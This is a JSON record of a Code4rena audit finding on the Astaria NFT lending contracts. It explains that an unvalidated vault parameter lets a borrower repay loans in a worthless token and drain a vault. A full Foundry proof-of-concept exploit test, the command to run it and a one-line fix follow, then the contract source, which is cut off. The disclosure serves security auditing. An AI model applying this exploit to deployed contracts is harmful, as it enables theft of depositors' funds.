{
  "Title": "[H-08] Lack of StrategyDetailsParam.vault validation allows the borrower to steal all the funds from the vault",
  "Content": "\n<https://github.com/code-423n4/2023-01-astaria/blob/main/src/VaultImplementation.sol#L287>\n\nWhen a borrower takes a loan, Strategy details are passed along with other required data, and through the overall **commitToLien** flow, all the data are validated except the StrategyDetailsParam.vault\n\n```sh\n  struct StrategyDetailsParam {\n    uint8 version;\n    uint256 deadline;\n    address vault;\n  }\n```\n\nA borrower then can pass different vault's address, and when creating a lien this  vault is considered. Later, the borrower makes a payment, it reads the asset from this vault. Thus, the borrower can take loans and repay with whatever token.\n\n<https://github.com/code-423n4/2023-01-astaria/blob/main/src/LienToken.sol#L849>\n\n### Exploit Scenario\n\nAllow me to describe a scenario where the borrower can steal all the funds from all vaults that support his/her collateral:\n\n1.  **Bob** owns an NFT.\n2.  **Bob** sends his NFT to the collateral token contract.\n3.  **Bob** creates his own private vault **BobVault** with an asset that he created **FakeToken** which doesn’t have any value in the market (e.g. just a new ERC20 token).\n4.  **Bob** takes a loan from **Vault1** (while passing **BobVault** in the strategy param).\n5.  **Bob** pay the loan with his **FakeToken** instead **Vault1**'s asset.\n6.  **Bob** then repeats the steps from point 4 again till **Vault1** is drained.\n7.  **Bob** now has all the funds from **Vault1** with **zero** debt.\n8.  **Strategist** has the same amount of **Vault1**'s funds but in **FakeToken**.\n\nThis exploit can be done with other vaults draining all the funds.<br>\nTo prove this, I've coded the scenario below.\n\n### Proof of Concept\n\n1.  Please create a file with a name **StealAllFundsExploit.t.sol** under **src/test/** directory.\n\n2.  Add the following code to the file.\n\n```sh\npragma solidity =0.8.17;\n\nimport \"forge-std/Test.sol\";\n\nimport {Authority} from \"solmate/auth/Auth.sol\";\nimport {FixedPointMathLib} from \"solmate/utils/FixedPointMathLib.sol\";\nimport {MockERC721} from \"solmate/test/utils/mocks/MockERC721.sol\";\nimport {\n  MultiRolesAuthority\n} from \"solmate/auth/authorities/MultiRolesAuthority.sol\";\n\nimport {ERC721} from \"gpl/ERC721.sol\";\nimport {SafeCastLib} from \"gpl/utils/SafeCastLib.sol\";\nimport {IAstariaRouter, AstariaRouter} from \"../AstariaRouter.sol\";\nimport {VaultImplementation} from \"../VaultImplementation.sol\";\nimport {PublicVault} from \"../PublicVault.sol\";\nimport {TransferProxy} from \"../TransferProxy.sol\";\nimport {WithdrawProxy} from \"../WithdrawProxy.sol\";\nimport \"./TestHelpers.t.sol\";\nimport {MockERC20} from \"solmate/test/utils/mocks/MockERC20.sol\";\nimport {IVaultImplementation} from \"../interfaces/IVaultImplementation.sol\";\n\n\n\ncontract AstariaTest is TestHelpers {\n  using FixedPointMathLib for uint256;\n  using CollateralLookup for address;\n  using SafeCastLib for uint256;\n\n\n  ILienToken.Details public lienDetails =\n      ILienToken.Details({\n        maxAmount: 50 ether,\n        rate: (uint256(1e16) * 150) / (365 days),\n        duration: 10 days,\n        maxPotentialDebt: 50 ether,\n        liquidationInitialAsk: 500 ether\n      });\n\n\n  function __createPrivateVault(address strategist, address delegate,address token)\n    internal\n    returns (address privateVault)\n  {\n    vm.startPrank(strategist);\n    privateVault = ASTARIA_ROUTER.newVault(delegate, token);\n    vm.stopPrank();\n  }    \n\n  \n function testPayWithDifferentAsset() public {\n    TestNFT nft = new TestNFT(2);\n    address tokenContract = address(nft);\n    uint256 initialBalance = WETH9.balanceOf(address(this));\n\n    // Create a private vault with WETH asset\n    address privateVault = __createPrivateVault({\n      strategist: strategistOne,\n      delegate: address(0),\n      token: address(WETH9)\n    });\n\n\n    _lendToPrivateVault(\n      Lender({addr: strategistOne, amountToLend: 500 ether}),\n      privateVault\n    );\n    \n    // Send the NFT to Collateral contract and receive Collateral token\n    ERC721(tokenContract).safeTransferFrom(address(this),address(COLLATERAL_TOKEN),1,\"\");\n\n    // generate valid terms\n    uint256 amount = 50 ether; // amount to borrow        \n    IAstariaRouter.Commitment memory c = _generateValidTerms({\n      vault: privateVault,\n      strategist: strategistOne,\n      strategistPK: strategistOnePK,\n      tokenContract: tokenContract,\n      tokenId: 1,\n      lienDetails: lienDetails,\n      amount: amount,\n      stack: new ILienToken.Stack[](0)\n    });\n\n    // Attack starts here\n    // The borrower an asset which has no value in the market\n    MockERC20 FakeToken = new MockERC20(\"USDC\", \"FakeAsset\", 18); // this could be any ERC token created by the attacker\n    FakeToken.mint(address(this),500 ether);\n    // The borrower creates a private vault with his/her asset\n    address privateVaultOfBorrower = __createPrivateVault({\n      strategist: address(this),\n      delegate: address(0),\n      token: address(FakeToken)\n    });\n\n    uint8 i;\n    for( ; i < 10 ; i ++) {\n      // Here is the exploit: commitToLien on privateVault while passing differentVault in the strategy\n      c.lienRequest.strategy.vault = privateVaultOfBorrower;   \n      (uint256 lienId, ILienToken.Stack[] memory stack , uint256 payout) = IVaultImplementation(privateVault).commitToLien(\n          c,\n          address(this)\n      );\n      console.log(\"Take 50 ether loan#%d\", (i+1));\n\n      // necessary approvals\n      FakeToken.approve(address(TRANSFER_PROXY), amount);\n      FakeToken.approve(address(LIEN_TOKEN), amount);\n\n      // pay the loan with FakeToken \n      ILienToken.Stack[] memory newStack = LIEN_TOKEN.makePayment(\n        stack[0].lien.collateralId,\n        stack,\n        uint8(0),\n        amount\n      );\n      console.log(\"Repay 50 FakeToken loan#%d\", (i+1));\n    }\n\n\n    // assertion\n    console.log(\"------\");\n    // Vault is drained\n    console.log(\"PrivateVault Balance: %d WETH\", WETH9.balanceOf(privateVault));\n    assertEq(WETH9.balanceOf(privateVault), 0); \n    // The borrower gets 500 ether\n    console.log(\"Borrower Balance: %d WETH\", WETH9.balanceOf(address(this)));\n    assertEq(WETH9.balanceOf(address(this)), initialBalance + 500 ether);\n    // strategist receives the fake token\n    console.log(\"Strategist Balance: %d FakeToken\", FakeToken.balanceOf(strategistOne));\n    assertEq(FakeToken.balanceOf(strategistOne), 500 ether);\n\n  }\n \n}\n\n\n```\n\n3.  Then run the forge test command as follows (replace `$FORK_URL` with your RPC URL):\n\n```sh\n forge test --ffi --fork-url $FORK_URL --fork-block-number 15934974 --match-path src/test/StealAllFundsExploit.t.sol -vv\n```\n\nThe test will pass. I've added comments in the code explaining the steps.\n\n*Note:The attack isn't possible when using AstariaRouter*\n\n### Recommended Mitigation Steps\n\nIn VaultImplementation's `commitToLien` function, add the following validation:\n\n```sh\nrequire(address(this) == params.lienRequest.strategy.vault,\"INVALID VAULT\");\n```\n\nRun the PoC test above again, and `testPayWithDifferentAsset` should fail.\n\n**[SantiagoGregory (Astaria) confirmed](https://github.com/code-423n4/2023-01-astaria-findings/issues/409)**\n\n\n\n***\n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/reports/2023-01-astaria",
  "Code": [
    {
      "filename": "src/VaultImplementation.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\n\n/**                                                     \n*  █████╗ ███████╗████████╗ █████╗ ██████╗ ██╗ █████╗ \n* ██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██║██╔══██╗\n* ███████║███████╗   ██║   ███████║██████╔╝██║███████║\n* ██╔══██║╚════██║   ██║   ██╔══██║██╔══██╗██║██╔══██║\n* ██║  ██║███████║   ██║   ██║  ██║██║  ██║██║██║  ██║\n* ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝\n*\n* Astaria Labs, Inc\n*/\n\npragma solidity =0.8.17;\n\nimport {ERC20} from \"solmate/tokens/ERC20.sol\";\nimport {ERC721, ERC721TokenReceiver} from \"solmate/tokens/ERC721.sol\";\nimport {FixedPointMathLib} from \"solmate/utils/FixedPointMathLib.sol\";\nimport {SafeTransferLib} from \"solmate/utils/SafeTransferLib.sol\";\nimport {CollateralLookup} from \"core/libraries/CollateralLookup.sol\";\n\nimport {IAstariaRouter} from \"core/interfaces/IAstariaRouter.sol\";\nimport {LienToken} from \"core/LienToken.sol\";\nimport {ILienToken} from \"core/interfaces/ILienToken.sol\";\nimport {IPublicVault} from \"core/interfaces/IPublicVault.sol\";\nimport {AstariaVaultBase} from \"core/AstariaVaultBase.sol\";\nimport {IVaultImplementation} from \"core/interfaces/IVaultImplementation.sol\";\nimport {SafeCastLib} from \"gpl/utils/SafeCastLib.sol\";\n\n/**\n * @title VaultImplementation\n * @notice A base implementation for the minimal features of an Astaria Vault.\n */\nabstract contract VaultImplementation is\n  AstariaVaultBase,\n  ERC721TokenReceiver,\n  IVaultImplementation\n{\n  using SafeTransferLib for ERC20;\n  using SafeCastLib for uint256;\n  using CollateralLookup for address;\n  using FixedPointMathLib for uint256;\n\n  bytes32 public constant STRATEGY_TYPEHASH =\n    keccak256(\"StrategyDetails(uint256 nonce,uint256 deadline,bytes32 root)\");\n\n  bytes32 constant EIP_DOMAIN =\n    keccak256(\n      \"EIP712Domain(string version,uint256 chainId,address verifyingContract)\"\n    );\n  bytes32 constant VERSION = keccak256(\"0\");\n\n  function name() external view virtual override returns (string memory);\n\n  function symbol() external view virtual override returns (string memory);\n\n  uint256 private constant VI_SLOT =\n    uint256(keccak256(\"xyz.astaria.VaultImplementation.storage.location\")) - 1;\n\n  function getStrategistNonce() external view returns (uint256) {\n    return _loadVISlot().strategistNonce;\n  }\n\n  function incrementNonce() external {\n    VIData storage s = _loadVISlot();\n    if (msg.sender != owner() && msg.sender != s.delegate) {\n      revert InvalidRequest(InvalidRequestReason.NO_AUTHORITY);\n    }\n    s.strategistNonce++;\n    emit NonceUpdated(s.strategistNonce);\n  }\n\n  /**\n   * @notice modify the deposit cap for the vault\n   * @param newCap The deposit cap.\n   */\n  function modifyDepositCap(uint256 newCap) external {\n    require(msg.sender == owner()); //owner is \"strategist\"\n    _loadVISlot().depositCap = newCap.safeCastTo88();\n  }\n\n  function _loadVISlot() internal pure returns (VIData storage s) {\n    uint256 slot = VI_SLOT;\n\n    assembly {\n      s.slot := slot\n    }\n  }\n\n  /**\n   * @notice modify the allowlist for the vault\n   * @param depositor the depositor to modify\n   * @param enabled the status of the depositor\n   */\n  function modifyAllowList(address depositor, bool enabled) external virtual {\n    require(msg.sender == owner()); //owner is \"strategist\"\n    _loadVISlot().allowList[depositor] = enabled;\n    emit AllowListUpdated(depositor, enabled);\n  }\n\n  /**\n   * @notice disable the allowList for the vault\n   */\n  function disableAllowList() external virtual {\n    require(msg.sender == owner()); //owner is \"strategist\"\n    _loadVISlot().allowListEnabled = false;\n    emit AllowListEnabled(false);\n  }\n\n  /**\n   * @notice enable the allowList for the vault\n   */\n  function enableAllowList() external virtual {\n    require(msg.sender == owner()); //owner is \"strategist\"\n    _loadVISlot().allowListEnabled = true;\n    emit AllowListEnabled(true);\n  }\n\n  /**\n   * @notice receive hook for ERC721 tokens, nothing special done\n   */\n  function onERC721Received(\n    address, // operator_\n    address, // from_\n    uint256, // tokenId_\n    bytes calldata // data_\n  ) external pure override returns (bytes4) {\n    return ERC721TokenReceiver.onERC721Received.selector;\n  }\n\n  modifier whenNotPaused() {\n    if (ROUTER().paused()) {\n      revert InvalidRequest(InvalidRequestReason.PAUSED);\n    }\n\n    if (_loadVISlot().isShutdown) {\n      revert InvalidRequest(InvalidRequestReason.SHUTDOWN);\n    }\n    _;\n  }\n\n  function getShutdown() external view returns (bool) {\n    return _loadVISlot().isShutdown;\n  }\n\n  function shutdown() external {\n    require(msg.sender == owner()); //owner is \"strategist\"\n    _loadVISlot().isShutdown = true;\n    emit VaultShutdown();\n  }\n\n  function domainSeparator() public view virtual returns (bytes32) {\n    return\n      keccak256(\n        abi.encode(\n          EIP_DOMAIN,\n          VERSION, //version\n          block.chainid,\n          address(this)\n        )\n      );\n  }\n\n  /*\n   * @notice encodes the data for a 712 signature\n   * @param tokenContract The address of the token contract\n   * @param tokenId The id of the token\n   * @param amount The amount of the token\n   */\n  function encodeStrategyData(\n    IAstariaRouter.StrategyDetailsParam calldata strategy,\n    bytes32 root\n  ) external view returns (bytes memory) {\n    VIData storage s = _loadVISlot();\n    return _encodeStrategyData(s, strategy, root);\n  }\n\n  function _encodeStrategyData(\n    VIData storage s,\n    IAstariaRouter.StrategyDetailsParam calldata strategy,\n    bytes32 root\n  ) internal view returns (bytes memory) {\n    bytes32 hash = keccak256(\n      abi.encode(STRATEGY_TYPEHASH, s.strategistNonce, strategy.deadline, root)\n    );\n    return\n      abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeparator(), hash);\n  }\n\n  function init(InitParams calldata params) external virtual {\n    require(msg.sender == address(ROUTER()));\n    VIData storage s = _loadVISlot();\n\n    if (params.delegate != address(0)) {\n      s.delegate = params.delegate;\n    }\n    s.depositCap = params.depositCap.safeCastTo88();\n    if (params.allowListEnabled) {\n      s.allowListEnabled = true;\n      uint256 i;\n      for (; i < params.allowList.length; ) {\n        s.allowList[params.allowList[i]] = true;\n        unchecked {\n          ++i;\n        }\n      }\n    }\n  }\n\n  function setDelegate(address delegate_) external {\n    require(msg.sender == owner()); //owner is \"strategist\"\n    VIData storage s = _loadVISlot();\n    s.delegate = delegate_;\n    emit DelegateUpdated(delegate_);\n    emit AllowListUpdated(delegate_, true);\n  }\n\n  /**\n   * @dev Validates the terms for a requested loan.\n   * Who is requesting the borrow, is it a smart contract? or is it a user?\n   * if a smart contract, then ensure that the contract is approved to borrow and is also receiving the funds.\n   * if a user, then ensure that the user is approved to borrow and is also receiving the funds.\n   * The terms are hashed and signed by the borrower, and the signature validated against the strategist's address\n   * lien details are decoded from the obligation data and validated the collateral\n   *\n   * @param params The Commitment information containing the loan parameters and the merkle proof for the strategy supporting the requested loan.\n   * @param receiver The address of the prospective borrower.\n   */\n  function _validateCommitment(\n    IAstariaRouter.Commitment calldata params,\n    address receiver\n  ) internal view {\n    uint256 collateralId = params.tokenContract.computeId(params.tokenId);\n    ERC721 CT = ERC721(address(COLLATERAL_TOKEN()));\n    address holder = CT.ownerOf(collateralId);\n    address operator = CT.getApproved(collateralId);\n    if (\n      msg.sender != holder &&\n      receiver != holder &&\n      receiver != operator &&\n      !CT.isApprovedForAll(holder, msg.sender)\n    ) {\n      revert InvalidRequest(InvalidRequestReason.NO_AUTHORITY);\n    }\n    VIData storage s = _loadVISlot();\n    address recovered = ecrecover(\n      keccak256(\n        _encodeStrategyData(\n          s,\n          params.lienRequest.strategy,\n          params.lienRequest.merkle.root\n        )\n      ),\n      params.lienRequest.v,\n      params.lienRequest.r,\n      params.lienRequest.s\n    );\n    if (\n      (recovered != owner() && recovered != s.delegate) ||\n      recovered == address(0)\n    ) {\n      revert IVaultImplementation.InvalidRequest(\n        InvalidRequestReason.INVALID_SIGNATURE\n      );\n    }\n  }\n\n  function _afterCommitToLien(\n    uint40 end,\n    uint256 lienId,\n    uint256 slope\n  ) internal virtual {}\n\n  function _beforeCommitToLien(IAstariaRouter.Commitment calldata)\n    internal\n    virtual\n  {}\n\n  /**\n   * @notice Pipeline for lifecycle of new loan origination.\n   * Origination consists of a few phases: pre-commitment validation, lien token issuance, strategist reward, and after commitment actions\n   * Starts by depositing collateral and take optimized-out a lien against it. Next, verifies the merkle proof for a loan commitment. Vault owners are then rewarded fees for successful loan origination.\n   * @param params Commitment data for the incoming lien request\n   * @param receiver The borrower receiving the loan.\n   * @return lienId The id of the newly minted lien token.\n   */\n  function commitToLien(\n    IAstariaRouter.Commitment calldata params,\n    address receiver\n  )\n    external\n    whenNotPaused\n    returns (uint256 lienId, ILienToken.Stack[] memory stack, uint256 payout)\n  {\n    _beforeCommitToLien(params);\n    uint256 slopeAddition;\n    (lienId, stack, slopeAddition, payout) = _requestLienAndIssuePayout(\n      params,\n      receiver\n    );\n    _afterCommitToLien(\n      stack[stack.length - 1].point.end,\n      lienId,\n      slopeAddition\n    );\n  }\n\n  /**\n   * @notice Buy optimized-out a lien to replace it with new terms.\n   * @param position The position of the specified lien.\n   * @param incomingTerms The loan terms of the new lien.\n   */\n  function buyoutLien(\n    ILienToken.Stack[] calldata stack,\n    uint8 position,\n    IAstariaRouter.Commitment calldata incomingTerms\n  )\n    external\n    whenNotPaused\n    returns (ILienToken.Stack[] memory, ILienToken.Stack memory)\n  {\n    LienToken lienToken = LienToken(address(ROUTER().LIEN_TOKEN()));\n\n    (uint256 owed, uint256 buyout) = lienToken.getBuyout(stack[position]);\n\n    if (buyout > ERC20(asset()).balanceOf(address(this))) {\n      revert IVaultImplementation.InvalidRequest(\n        InvalidRequestReason.INSUFFICIENT_FUNDS\n      );\n    }\n\n    _validateCommitment(incomingTerms, recipient());\n\n    ERC20(asset()).safeApprove(address(ROUTER().TRANSFER_PROXY()), buyout);\n\n    return\n      lienToken.buyoutLien(\n        ILienToken.LienActionBuyout({\n          position: position,\n          encumber: ILienToken.LienActionEncumber({\n            amount: owed,\n            receiver: recipient(),\n            lien: ROUTER().validateCommitment({\n              commitment: incomingTerms,\n              timeToSecondEpochEnd: _timeToSecondEndIfPublic()\n            }),\n            stack: stack\n          })\n        })\n      );\n  }\n\n  function _timeToSecondEndIfPublic()\n    internal\n    view\n    virtual\n    returns (uint256 timeToSecondEpochEnd)\n  {\n    return 0;\n  }\n\n  /**\n   * @notice Retrieves the recipient of loan repayments. For PublicVaults (VAULT_TYPE 2), this is always the vault address. For PrivateVaults, retrieves the owner() of the vault.\n   * @return The address of the recipient.\n   */\n  function recipient() public view returns (address) {\n    if (IMPL_TYPE() == uint8(IAstariaRouter.ImplementationType.PublicVault)) {\n      return address(this);\n    } else {\n      return owner();\n    }\n  }\n\n  /**\n   * @dev Generates a Lien for a valid loan commitment proof and sends the loan amount to the borrower.\n   * @param c The Commitment information containing the loan parameters and the merkle proof for the strategy supporting the requested loan.\n   * @param receiver The borrower requesting the loan.\n   */\n  function _requestLienAndIssuePayout(\n    IAstariaRouter.Commitment calldata c,\n    address receiver\n  )\n    internal\n    returns (\n      uint256 newLienId,\n      ILienToken.Stack[] memory stack,\n      uint256 slope,\n      uint256 payout\n    )\n  {\n    _validateCommitment(c, receiver);\n    (newLienId, stack, slope) = ROUTER().requestLienPosition(c, recipient());\n    payout = _handleProtocolFee(c.lienRequest.amount);\n    ERC20(asset()).safeTransfer(receiver, payout);\n  }\n\n  function _handleProtocolFee(uint256 amount) internal returns (uint256) {\n    address feeTo = ROUTER().feeTo();\n    bool feeOn = feeTo != address(0);\n    if (feeOn) {\n      uint256 fee = ROUTER().getProtocolFee(amount);\n\n      unchecked {\n        amount -= fee;\n      }\n      ERC20(asset()).safeTransfer(feeTo, fee);\n    }\n    return amount;\n  }\n}"
    },
    {
      "filename": "src/LienToken.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\n\n/**                                                     \n*  █████╗ ███████╗████████╗ █████╗ ██████╗ ██╗ █████╗ \n* ██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██║██╔══██╗\n* ███████║███████╗   ██║   ███████║██████╔╝██║███████║\n* ██╔══██║╚════██║   ██║   ██╔══██║██╔══██╗██║██╔══██║\n* ██║  ██║███████║   ██║   ██║  ██║██║  ██║██║██║  ██║\n* ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝\n*\n* Astaria Labs, Inc\n*/\n\npragma solidity =0.8.17;\n\npragma experimental ABIEncoderV2;\n\nimport {Auth, Authority} from \"solmate/auth/Auth.sol\";\nimport {FixedPointMathLib} from \"solmate/utils/FixedPointMathLib.sol\";\n\nimport {ERC721} from \"gpl/ERC721.sol\";\nimport {IERC721} from \"core/interfaces/IERC721.sol\";\nimport {IERC165} from \"core/interfaces/IERC165.sol\";\nimport {ITransferProxy} from \"core/interfaces/ITransferProxy.sol\";\nimport {SafeCastLib} from \"gpl/utils/SafeCastLib.sol\";\n\nimport {CollateralLookup} from \"core/libraries/CollateralLookup.sol\";\n\nimport {IAstariaRouter} from \"core/interfaces/IAstariaRouter.sol\";\nimport {ICollateralToken} from \"core/interfaces/ICollateralToken.sol\";\nimport {ILienToken} from \"core/interfaces/ILienToken.sol\";\n\nimport {IPublicVault} from \"core/interfaces/IPublicVault.sol\";\nimport {VaultImplementation} from \"./VaultImplementation.sol\";\nimport {ERC20} from \"solmate/tokens/ERC20.sol\";\nimport {SafeTransferLib} from \"solmate/utils/SafeTransferLib.sol\";\nimport {AuthInitializable} from \"core/AuthInitializable.sol\";\nimport {Initializable} from \"./utils/Initializable.sol\";\n\n/**\n * @title LienToken\n * @notice This contract handles the creation, payments, buyouts, and liquidations of tokenized NFT-collateralized debt (liens). Vaults which originate loans against supported collateral are issued a LienToken representing the right to loan repayments and auctioned funds on liquidation.\n */\ncontract LienToken is ERC721, ILienToken, AuthInitializable {\n  using FixedPointMathLib for uint256;\n  using CollateralLookup for address;\n  using SafeCastLib for uint256;\n  using SafeTransferLib for ERC20;\n\n  uint256 private constant LIEN_SLOT =\n    uint256(keccak256(\"xyz.astaria.LienToken.storage.location\")) - 1;\n\n  bytes32 constant ACTIVE_AUCTION = bytes32(\"ACTIVE_AUCTION\");\n\n  constructor() {\n    _disableInitializers();\n  }\n\n  function initialize(Authority _AUTHORITY, ITransferProxy _TRANSFER_PROXY)\n    public\n    initializer\n  {\n    __initAuth(msg.sender, address(_AUTHORITY));\n    __initERC721(\"Astaria Lien Token\", \"ALT\");\n    LienStorage storage s = _loadLienStorageSlot();\n    s.TRANSFER_PROXY = _TRANSFER_PROXY;\n    s.maxLiens = uint8(5);\n  }\n\n  function _loadLienStorageSlot()\n    internal\n    pure\n    returns (LienStorage storage s)\n  {\n    uint256 slot = LIEN_SLOT;\n\n    assembly {\n      s.slot := slot\n    }\n  }\n\n  function file(File calldata incoming) external requiresAuth {\n    FileType what = incoming.what;\n    bytes memory data = incoming.data;\n    LienStorage storage s = _loadLienStorageSlot();\n    if (what == FileType.CollateralToken) {\n      s.COLLATERAL_TOKEN = ICollateralToken(abi.decode(data, (address)));\n    } else if (what == FileType.AstariaRouter) {\n      s.ASTARIA_ROUTER = IAstariaRouter(abi.decode(data, (address)));\n    } else {\n      revert UnsupportedFile();\n    }\n    emit FileUpdated(what, data);\n  }\n\n  function supportsInterface(bytes4 interfaceId)\n    public\n    view\n    override(ERC721, IERC165)\n    returns (bool)\n  {\n    return\n      interfaceId == type(ILienToken).interfaceId ||\n      super.supportsInterface(interfaceId);\n  }\n\n  function buyoutLien(ILienToken.LienActionBuyout calldata params)\n    external\n    validateStack(params.encumber.lien.collateralId, params.encumber.stack)\n    returns (Stack[] memory, Stack memory newStack)\n  {\n    if (block.timestamp >= params.encumber.stack[params.position].point.end) {\n      revert InvalidState(InvalidStates.EXPIRED_LIEN);\n    }\n    LienStorage storage s = _loadLienStorageSlot();\n    if (!s.ASTARIA_ROUTER.isValidVault(msg.sender)) {\n      revert InvalidSender();\n    }\n    return _buyoutLien(s, params);\n  }\n\n  function _buyoutLien(\n    LienStorage storage s,\n    ILienToken.LienActionBuyout calldata params\n  ) internal returns (Stack[] memory newStack, Stack memory newLien) {\n    //the borrower shouldn't incur more debt from the buyout than they already owe\n    (, newLien) = _createLien(s, params.encumber);\n    if (\n      !s.ASTARIA_ROUTER.isValidRefinance({\n        newLien: params.encumber.lien,\n        position: params.position,\n        stack: params.encumber.stack\n      })\n    ) {\n      revert InvalidRefinance();\n    }\n\n    if (\n      s.collateralStateHash[params.encumber.lien.collateralId] == ACTIVE_AUCTION\n    ) {\n      revert InvalidState(InvalidStates.COLLATERAL_AUCTION);\n    }\n    (uint256 owed, uint256 buyout) = _getBuyout(\n      s,\n      params.encumber.stack[params.position]\n    );\n\n    if (params.encumber.lien.details.maxAmount < owed) {\n      revert InvalidBuyoutDetails(params.encumber.lien.details.maxAmount, owed);\n    }\n\n    uint256 potentialDebt = 0;\n    for (uint256 i = params.encumber.stack.length; i > 0; ) {\n      uint256 j = i - 1;\n      // should not be able to purchase lien if any lien in the stack is expired (and will be liquidated)\n      if (block.timestamp >= params.encumber.stack[j].point.end) {\n        revert InvalidState(InvalidStates.EXPIRED_LIEN);\n      }\n\n      potentialDebt += _getOwed(\n        params.encumber.stack[j],\n        params.encumber.stack[j].point.end\n      );\n\n      if (\n        potentialDebt >\n        params.encumber.stack[j].lien.details.liquidationInitialAsk\n      ) {\n        revert InvalidState(InvalidStates.INITIAL_ASK_EXCEEDED);\n      }\n\n      unchecked {\n        --i;\n      }\n    }\n\n    address payee = _getPayee(\n      s,\n      params.encumber.stack[params.position].point.lienId\n    );\n    s.TRANSFER_PROXY.tokenTransferFrom(\n      params.encumber.stack[params.position].lien.token,\n      msg.sender,\n      payee,\n      buyout\n    );\n\n    if (_isPublicVault(s, payee)) {\n      IPublicVault(payee).handleBuyoutLien(\n        IPublicVault.BuyoutLienParams({\n          lienSlope: calculateSlope(params.encumber.stack[params.position]),\n          lienEnd: params.encumber.stack[params.position].point.end,\n          increaseYIntercept: buyout -\n            params.encumber.stack[params.position].point.amount\n        })\n      );\n    }\n\n    newStack = _replaceStackAtPositionWithNewLien(\n      s,\n      params.encumber.stack,\n      params.position,\n      newLien,\n      params.encumber.stack[params.position].point.lienId\n    );\n    uint256 maxPotentialDebt;\n    uint256 n = newStack.length;\n    uint256 i;\n    for (i; i < n; ) {\n      maxPotentialDebt += _getOwed(newStack[i], newStack[i].point.end);\n      //no need to check validity before the position we're buying\n      if (i == params.position) {\n        if (maxPotentialDebt > params.encumber.lien.details.maxPotentialDebt) {\n          revert InvalidState(InvalidStates.DEBT_LIMIT);\n        }\n      }\n      if (\n        i > params.position &&\n        (maxPotentialDebt > newStack[i].lien.details.maxPotentialDebt)\n      ) {\n        revert InvalidState(InvalidStates.DEBT_LIMIT);\n      }\n      unchecked {\n        ++i;\n      }\n    }\n\n    s.collateralStateHash[params.encumber.lien.collateralId] = keccak256(\n      abi.encode(newStack)\n    );\n  }\n\n  function _replaceStackAtPositionWithNewLien(\n    LienStorage storage s,\n    ILienToken.Stack[] calldata stack,\n    uint256 position,\n    Stack memory newLien,\n    uint256 oldLienId\n  ) internal returns (ILienToken.Stack[] memory newStack) {\n    newStack = stack;\n    newStack[position] = newLien;\n    _burn(oldLienId);\n    delete s.lienMeta[oldLienId];\n  }\n\n  function getInterest(Stack calldata stack) public view returns (uint256) {\n    return _getInterest(stack, block.timestamp);\n  }\n\n  /**\n   * @dev Computes the interest accrued for a lien since its last payment.\n   * @param stack The Lien for the loan to calculate interest for.\n   * @param timestamp The timestamp at which to compute interest for.\n   */\n  function _getInterest(Stack memory stack, uint256 timestamp)\n    internal\n    pure\n    returns (uint256)\n  {\n    uint256 delta_t = timestamp - stack.point.last;\n\n    return (delta_t * stack.lien.details.rate).mulWadDown(stack.point.amount);\n  }\n\n  modifier validateStack(uint256 collateralId, Stack[] memory stack) {\n    LienStorage storage s = _loadLienStorageSlot();\n    bytes32 stateHash = s.collateralStateHash[collateralId];\n    if (stateHash == bytes32(0) && stack.length != 0) {\n      revert InvalidState(InvalidStates.EMPTY_STATE);\n    }\n    if (stateHash != bytes32(0) && keccak256(abi.encode(stack)) != stateHash) {\n      revert InvalidState(InvalidStates.INVALID_HASH);\n    }\n    _;\n  }\n\n  function stopLiens(\n    uint256 collateralId,\n    uint256 auctionWindow,\n    Stack[] calldata stack,\n    address liquidator\n  ) external validateStack(collateralId, stack) requiresAuth {\n    _stopLiens(\n      _loadLienStorageSlot(),\n      collateralId,\n      auctionWindow,\n      stack,\n      liquidator\n    );\n  }\n\n  function _stopLiens(\n    LienStorage storage s,\n    uint256 collateralId,\n    uint256 auctionWindow,\n    Stack[] calldata stack,\n    address liquidator\n  ) internal {\n    AuctionData memory auctionData;\n    auctionData.liquidator = liquidator;\n    auctionData.stack = new AuctionStack[](stack.length);\n    s.auctionData[collateralId].liquidator = liquidator;\n    uint256 i;\n    for (; i < stack.length; ) {\n      AuctionStack memory auctionStack;\n\n      auctionStack.lienId = stack[i].point.lienId;\n      auctionStack.end = stack[i].point.end;\n      uint88 owed = _getOwed(stack[i], block.timestamp);\n      auctionStack.amountOwed = owed;\n      s.lienMeta[auctionStack.lienId].atLiquidation = true;\n      auctionData.stack[i] = auctionStack;\n      address payee = _getPayee(s, auctionStack.lienId);\n      if (_isPublicVault(s, payee)) {\n        // update the public vault state and get the liquidation accountant back if any\n        address withdrawProxyIfNearBoundary = IPublicVault(payee)\n          .updateVaultAfterLiquidation(\n            auctionWindow,\n            IPublicVault.AfterLiquidationParams({\n              lienSlope: calculateSlope(stack[i]),\n              newAmount: owed,\n              lienEnd: stack[i].point.end\n            })\n          );\n\n        if (withdrawProxyIfNearBoundary != address(0)) {\n          _setPayee(s, auctionStack.lienId, withdrawProxyIfNearBoundary);\n        }\n      }\n      unchecked {\n        ++i;\n      }\n    }\n    s.collateralStateHash[collateralId] = ACTIVE_AUCTION;\n    auctionData.startTime = block.timestamp.safeCastTo48();\n    auctionData.endTime = (block.timestamp + auctionWindow).safeCastTo48();\n    auctionData.startAmount = stack[0]\n      .lien\n      .details\n      .liquidationInitialAsk\n      .safeCastTo88();\n    auctionData.endAmount = uint88(1000 wei);\n    s.COLLATERAL_TOKEN.getClearingHouse(collateralId).setAuctionData(\n      auctionData\n    );\n  }\n\n  function tokenURI(uint256 tokenId)\n    public\n    view\n    override(ERC721, IERC721)\n    returns (string memory)\n  {\n    if (!_exists(tokenId)) {\n      revert InvalidTokenId(tokenId);\n    }\n    return \"\";\n  }\n\n  function transferFrom(\n    address from,\n    address to,\n    uint256 id\n  ) public override(ERC721, IERC721) {\n    LienStorage storage s = _loadLienStorageSlot();\n    if (_isPublicVault(s, to)) {\n      revert InvalidState(InvalidStates.PUBLIC_VAULT_RECIPIENT);\n    }\n    if (s.lienMeta[id].atLiquidation) {\n      revert InvalidState(InvalidStates.COLLATERAL_AUCTION);\n    }\n    delete s.lienMeta[id].payee;\n    emit 